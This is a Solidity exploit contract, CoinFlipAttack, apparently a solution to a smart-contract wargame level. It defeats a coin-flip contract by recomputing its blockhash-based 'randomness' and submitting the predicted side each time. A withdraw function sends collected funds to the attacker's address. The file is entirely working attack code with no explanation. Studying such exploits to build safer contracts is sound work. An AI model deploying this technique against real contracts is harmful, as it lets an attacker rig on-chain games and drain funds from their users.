pragma solidity 0.6.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {
 
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip _contract;
    address payable public owner;

    constructor(address payable _add) public {
        owner = msg.sender;
        _contract = CoinFlip(_add);
    }

    function flipAttack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        guessAttack(side);
    }

    function guessAttack(bool _side) private {
        _contract.flip(_side);
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }
    
    receive() external payable{ 
    }

}